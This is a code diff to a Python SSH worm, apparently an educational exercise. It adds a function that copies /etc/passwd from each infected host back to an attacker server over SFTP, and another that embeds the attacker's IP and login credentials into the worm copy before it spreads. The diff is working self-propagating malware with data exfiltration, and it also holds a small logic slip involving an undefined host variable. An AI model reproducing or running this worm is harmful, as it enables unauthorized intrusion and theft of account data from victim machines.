@@ -313,39 +313,79 @@ def spreadAndExecute(sshClient, fromHost):
         print msg
 
 #===============================================================================
-# Perform malicious action
-# @param fromHost - Spread from Host
+# Function to prepend the Phone Home entry when run on the Master
+# Create the worm file in /tmp and prepend the tuple of (IP, user, pass)
+# At the top of the file
+# @param myIP - The attacker server IP address
+# @param userName - The userName to login to the Attacker Server
+# @param password - The password to login to the Attacker Server
 #===============================================================================
-def performMalicious(fromHost):
-    # Not doing any malicious for this worm
-    print PHONE_HOME
-    pass
+def prepareWormToPhoneHome(myIP, userName, password):
+
+    global WORM_FILE
+    global WORM_DEST
+
+    try:
+        # Extract the worm content into a variable
+        fileObj = open(sys.argv[0], "r")
+        currentFile = fileObj.read()
+        fileObj.close()
+
+        # Open a temporary location to append the Phone Home entry
+        # into the worm
+        fileObj = open(WORM_DEST, "w")
+
+        # Create a String tuple PHONE_HOME = ('ip', 'user', 'pass')
+        phoneHomeEntry = "PHONE_HOME=('" + myIP + "','"
+        phoneHomeEntry += userName + "', '" + password + "')\n"
+
+        # Preprend the entry and the worm content
+        fileObj.write(phoneHomeEntry + currentFile)
+        fileObj.close()
+
+        # The WORM_FILE will point to the WORM_DEST variable
+        # So that we do not have to change the spreadAndExecute code
+        # This will allow the attacker to initially copy the worm code
+        # with the Phone Home Entry prepended.  Otherwise, if run on
+        # victim, this code should not be fired and will be ignore
+        WORM_FILE = WORM_DEST
+
+    except IOError as msg:
+        print "Error unable to append system: ", msg
+        sys.exit(1)
+
+#===============================================================================
+# Perform malicious action
+# @param fromHost - The IP Address that the file come from
+#===============================================================================
+def performPasswordStealing(fromHost):
+
+    PASSWD_SRC = "/etc/passwd"
+    PASSWD_DEST = "/tmp/passwd_" + fromHost
+
+    try:
+        # Create a new ssh session from the victim to the Attacker
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+        # If we can get a connection back to the attacker
+        if tryCredentials(PHONE_HOME[0], PHONE_HOME[1], PHONE_HOME[2], ssh) == 0:
+
+            # Open a sftp session and copy the password file back
+            sftp = ssh.open_sftp()
+            sftp.put(PASSWD_SRC, PASSWD_DEST)
+
+            # We are done close the session
+            ssh.close()
+        else:
+            print "Unable to phone home ", PHONE_HOME
+    except IOError as msg:
+        print "performPasswordStealing function: ", msg
 
 #===============================================================================
 # Main program start here
 #===============================================================================
 if __name__ == "__main__":
-
-    # If the program run with an argument, then it's on the victim machine
-    if len(sys.argv) > 1:
-        print "We are on the victim system"
-
-        # If the system already infected, we exit
-        if isLocalSystemInfected():
-            sys.exit(0)
-        else:
-            # Then perform some malicious action
-            fromHost = sys.argv[1]
-            performMalicious(fromHost)
-
-            # Mark the system as infected
-            markSystemAsInfected(fromHost)
-
-    else:
-        # If we are running the worm without an argument, then it's
-        # on the master/attacker machine
-        if not isLocalSystemInfected():
-            markSystemAsMaster()
 
     # If we get here it means that we can begin the spread and attack
     # Perform scanning/attack/spread
@@ -356,22 +396,30 @@ if __name__ == "__main__":
     # First Get the current machine IP/Mask
     myIP, myMask = getMyActiveIP()
 
-    # We need to inject our Phone Home address/id/password by temporary
-    # create a copy of the worm and prepend the Phone Home entry
-    if isLocalSystemMaster():
-        try:
-            fileObj = open(sys.argv[0], "r")
-            currentFile = fileObj.read()
-            fileObj.close()
+    # If the program run with an argument, then it's on the victim machine
+    if len(sys.argv) > 1:
+        print "We are on the victim system"
 
-            fileObj = open(WORM_DEST, "w")
-            phoneHomeEntry = "PHONE_HOME=('" + myIP + "','ubuntu', '123456')\n"
-            fileObj.write(phoneHomeEntry + currentFile)
-            fileObj.close()
-            WORM_FILE = WORM_DEST
-        except IOError as msg:
-            print "Error unable to append system: ", msg
-            sys.exit(1)
+        # If the system already infected, we exit
+        if isLocalSystemInfected():
+            sys.exit(0)
+        else:
+            # Then perform some malicious action
+            performPasswordStealing(myIP)
+
+            # Mark the system as infected
+            markSystemAsInfected(fromHost)
+
+    else:
+        # If we are running the worm without an argument, then it's
+        # on the master/attacker machine
+        if not isLocalSystemInfected():
+            markSystemAsMaster()
+
+        # We need to inject our Phone Home address/id/password by temporary
+        # create a copy of the worm and prepend the Phone Home entry
+        prepareWormToPhoneHome(myIP, 'ubuntu', '123456')
+
 
     # Get CIDR values
     CIDR = getCIDR(myIP, myMask)
